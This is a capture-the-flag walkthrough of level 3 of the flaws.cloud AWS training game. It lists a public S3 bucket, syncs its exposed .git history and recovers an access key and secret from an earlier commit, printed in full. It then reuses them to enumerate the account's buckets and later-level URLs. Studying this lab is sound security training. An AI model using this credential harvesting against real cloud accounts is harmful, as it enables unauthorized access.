# Level - 3

**The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.**

The clue here we can note is that we need to find a AWS key. 

We can start by enumerating the domain

```bash
┌──(root㉿kali)-[/home/kali/Desktop/flaws.cloud]
└─# host level3-9afd3927f195e10225021a578e6f78df.flaws.cloud 
level3-9afd3927f195e10225021a578e6f78df.flaws.cloud has address 52.92.226.19
level3-9afd3927f195e10225021a578e6f78df.flaws.cloud has address 52.92.234.83
level3-9afd3927f195e10225021a578e6f78df.flaws.cloud has address 52.92.155.115
level3-9afd3927f195e10225021a578e6f78df.flaws.cloud has address 52.92.201.227
level3-9afd3927f195e10225021a578e6f78df.flaws.cloud has address 52.92.152.123
level3-9afd3927f195e10225021a578e6f78df.flaws.cloud has address 52.92.225.35
level3-9afd3927f195e10225021a578e6f78df.flaws.cloud has address 52.92.228.51
level3-9afd3927f195e10225021a578e6f78df.flaws.cloud has address 52.92.236.163
```

We can see that we have found 8 IP addresses that are all associated to the aws S3.

Further we can now use our —no-sign-request to list the contents of our S3 bucket and see if we require any access to list them.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/flaws.cloud]
└─# aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --no-sign-request
                           PRE .git/
2017-02-26 19:14:33     123637 authenticated_users.png
2017-02-26 19:14:34       1552 hint1.html
2017-02-26 19:14:34       1426 hint2.html
2017-02-26 19:14:35       1247 hint3.html
2017-02-26 19:14:33       1035 hint4.html
2020-05-22 14:21:10       1861 index.html
2017-02-26 19:14:33         26 robots.txt
```

We can see different hint files and authenticated_uses.png file and .git
We can sync these to our local machine and further enumerate them locally using git.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/flaws.cloud]
└─# aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --no-sign-request .
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/description to .git/description
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/COMMIT_EDITMSG to .git/COMMIT_EDITMSG
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/logs/HEAD to .git/logs/HEAD
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/logs/refs/heads/master to .git/logs/refs/heads/master
```

Using the above command we sync all the aws files to our local directory.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/flaws.cloud]
└─# ls -la
total 160
drwxr-xr-x  3 kali kali   4096 Feb 13 15:23 .
drwxr-xr-x 12 kali kali   4096 Feb 13 01:47 ..
-rw-r--r--  1 root root 123637 Feb 26  2017 authenticated_users.png
drwxr-xr-x  7 root root   4096 Feb 13 15:23 .git
-rw-r--r--  1 root root   1552 Feb 26  2017 hint1.html
-rw-r--r--  1 root root   1426 Feb 26  2017 hint2.html
-rw-r--r--  1 root root   1247 Feb 26  2017 hint3.html
-rw-r--r--  1 root root   1035 Feb 26  2017 hint4.html
-rw-r--r--  1 root root   1861 May 22  2020 index.html
-rw-r--r--  1 root root     26 Feb 26  2017 robots.txt
```

We changed our directory to .git and checked to see the log we can see a message here that something was accidentally commited in git.

```bash

                                                                                                                                                 
┌──(root㉿kali)-[/home/kali/Desktop/flaws.cloud/]
└─# git log                                                       
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```

We will change our current commit to the the first commit to see if we can find any access keys.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/flaws.cloud]
└─# git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
fatal: this operation must be run in a work tree
                                                                                                                                                 
┌──(root㉿kali)-[/home/kali/Desktop/flaws.cloud/.git]
└─# cd ..  
                                                                                                                                                 
┌──(root㉿kali)-[/home/kali/Desktop/flaws.cloud]
└─# git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
M       index.html
Note: switching to 'f52ec03b227ea6094b04e43f475fb0126edb5a61'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at f52ec03 first commit
                                                                                                                                                 
┌──(root㉿kali)-[/home/kali/Desktop/flaws.cloud]
└─# ls    
access_keys.txt  authenticated_users.png  hint1.html  hint2.html  hint3.html  hint4.html  index.html  robots.txt
```

We can see that after using the git checkout command we have generated a new file called as access_keys.txt.

The file has details about the access key and secret

```bash
┌──(root㉿kali)-[/home/kali/Desktop/flaws.cloud]
└─# cat access_keys.txt 
access_key AKIAJ366LIPB4IJKT7SA
secret_access_key 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
```

We can create a new profile with the information and try to use this profile to list the buckets.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/flaws.cloud]
└─# aws configure --profile=level3                                                          
AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7SA
AWS Secret Access Key [None]: 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
Default region name [None]: 
Default output format [None]:
```

We can now list the buckets the new profile has

```bash
┌──(root㉿kali)-[/home/kali/Desktop/flaws.cloud]
└─# aws sts get-caller-identity --profile level3
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
                                                                                                                                                 
┌──(root㉿kali)-[/home/kali/Desktop/flaws.cloud]
└─# aws s3 ls  --profile=level3 
2017-02-12 16:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 12:34:53 config-bucket-975426262029
2017-02-12 15:03:24 flaws-logs
2017-02-04 22:40:07 flaws.cloud
2017-02-23 20:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 13:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 13:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-26 14:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-26 14:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-26 15:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

We can see that the domain to the level-4, level-5, level-6 is noted we tried accessing the level-5 and level-6 but we were shown error.

The level - 4 url is  http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud.
